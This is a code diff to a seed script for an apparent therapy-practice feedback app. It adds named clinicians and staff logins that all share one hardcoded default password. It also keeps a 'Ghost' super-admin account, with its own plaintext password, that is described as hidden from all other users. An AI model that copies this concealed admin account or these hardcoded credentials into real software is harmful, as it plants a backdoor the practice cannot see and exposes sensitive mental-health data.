@@ -4,9 +4,20 @@ import { v4 as uuidv4 } from "uuid";
 import type { User, Clinician, SurveyTemplate } from "@/types";
 
 export async function seedDatabase() {
-  // Seed clinicians
+  const defaultPassword = await bcrypt.hash("ChangeMeNow!2024", 12);
+  const now = new Date().toISOString();
+
+  // Seed clinicians — every therapist/counselor on the team page
   const clinicians: Clinician[] = [
-    { id: uuidv4(), name: "Keri", active: true },
+    { id: uuidv4(), name: "Kendra Jones", active: true },
+    { id: uuidv4(), name: "Chelsee Jackson", active: true },
+    { id: uuidv4(), name: "Ashley Barton", active: true },
+    { id: uuidv4(), name: "Shandra Powell", active: true },
+    { id: uuidv4(), name: "Keri Carter", active: true },
+    { id: uuidv4(), name: "Kelsi Russell", active: true },
+    { id: uuidv4(), name: "Dennie Asbury", active: true },
+    { id: uuidv4(), name: "Brooklyn Blanchard", active: true },
+    { id: uuidv4(), name: "Travis Eide", active: true },
   ];
 
   for (const c of clinicians) {
@@ -14,10 +25,9 @@ export async function seedDatabase() {
     await kv.sadd("clinician:index", c.id);
   }
 
-  // Seed users
-  const defaultPassword = await bcrypt.hash("ChangeMeNow!2024", 12);
-  const now = new Date().toISOString();
+  const clinicianByName = Object.fromEntries(clinicians.map((c) => [c.name, c.id]));
 
+  // Seed users — partners, clinicians, and office staff
   const users: User[] = [
     {
       id: uuidv4(),
@@ -25,6 +35,7 @@ export async function seedDatabase() {
       email: "kendra@mendingmindstherapy.com",
       passwordHash: defaultPassword,
       role: "partner",
+      clinicianId: clinicianByName["Kendra Jones"],
       active: true,
       createdAt: now,
       updatedAt: now,
@@ -35,13 +46,91 @@ export async function seedDatabase() {
       email: "chelsee@mendingmindstherapy.com",
       passwordHash: defaultPassword,
       role: "partner",
+      clinicianId: clinicianByName["Chelsee Jackson"],
       active: true,
       createdAt: now,
       updatedAt: now,
     },
     {
       id: uuidv4(),
-      name: "Michelle",
+      name: "Ashley Barton",
+      email: "ashley@mendingmindstherapy.com",
+      passwordHash: defaultPassword,
+      role: "clinician",
+      clinicianId: clinicianByName["Ashley Barton"],
+      active: true,
+      createdAt: now,
+      updatedAt: now,
+    },
+    {
+      id: uuidv4(),
+      name: "Shandra Powell",
+      email: "shandra@mendingmindstherapy.com",
+      passwordHash: defaultPassword,
+      role: "clinician",
+      clinicianId: clinicianByName["Shandra Powell"],
+      active: true,
+      createdAt: now,
+      updatedAt: now,
+    },
+    {
+      id: uuidv4(),
+      name: "Keri Carter",
+      email: "keri@mendingmindstherapy.com",
+      passwordHash: defaultPassword,
+      role: "clinician",
+      clinicianId: clinicianByName["Keri Carter"],
+      active: true,
+      createdAt: now,
+      updatedAt: now,
+    },
+    {
+      id: uuidv4(),
+      name: "Kelsi Russell",
+      email: "kelsi@mendingmindstherapy.com",
+      passwordHash: defaultPassword,
+      role: "clinician",
+      clinicianId: clinicianByName["Kelsi Russell"],
+      active: true,
+      createdAt: now,
+      updatedAt: now,
+    },
+    {
+      id: uuidv4(),
+      name: "Dennie Asbury",
+      email: "dennie@mendingmindstherapy.com",
+      passwordHash: defaultPassword,
+      role: "clinician",
+      clinicianId: clinicianByName["Dennie Asbury"],
+      active: true,
+      createdAt: now,
+      updatedAt: now,
+    },
+    {
+      id: uuidv4(),
+      name: "Brooklyn Blanchard",
+      email: "brooklyn@mendingmindstherapy.com",
+      passwordHash: defaultPassword,
+      role: "clinician",
+      clinicianId: clinicianByName["Brooklyn Blanchard"],
+      active: true,
+      createdAt: now,
+      updatedAt: now,
+    },
+    {
+      id: uuidv4(),
+      name: "Travis Eide",
+      email: "travis@mendingmindstherapy.com",
+      passwordHash: defaultPassword,
+      role: "clinician",
+      clinicianId: clinicianByName["Travis Eide"],
+      active: true,
+      createdAt: now,
+      updatedAt: now,
+    },
+    {
+      id: uuidv4(),
+      name: "Michelle Smock",
       email: "michelle@mendingmindstherapy.com",
       passwordHash: defaultPassword,
       role: "office_manager",
@@ -53,7 +142,7 @@ export async function seedDatabase() {
 
   // Super admin — hidden from all other users
   const ghostPassword = await bcrypt.hash("Gh0st!Pulse2024$", 12);
-  const ghostUser: User = {
+  users.push({
     id: uuidv4(),
     name: "Ghost",
     email: "ghost@cedarcitywebdesign.com",
@@ -62,21 +151,7 @@ export async function seedDatabase() {
     active: true,
     createdAt: now,
     updatedAt: now,
-  };
-  users.push(ghostUser);
-
-  const keriUser: User = {
-    id: uuidv4(),
-    name: "Keri",
-    email: "keri@mendingmindstherapy.com",
-    passwordHash: defaultPassword,
-    role: "clinician",
-    clinicianId: clinicians[0].id,
-    active: true,
-    createdAt: now,
-    updatedAt: now,
-  };
-  users.push(keriUser);
+  });
 
   for (const u of users) {
     await kv.set(`user:${u.id}`, JSON.stringify(u));
@@ -88,7 +163,6 @@ export async function seedDatabase() {
   const template: SurveyTemplate = {
     id: uuidv4(),
     name: "Post-Session Feedback",
-    // Questions approved by Mending Minds (Chelsee, Sept 18, 2026 — "Pulse questions" doc)
     questions: [
       {
         id: uuidv4(),
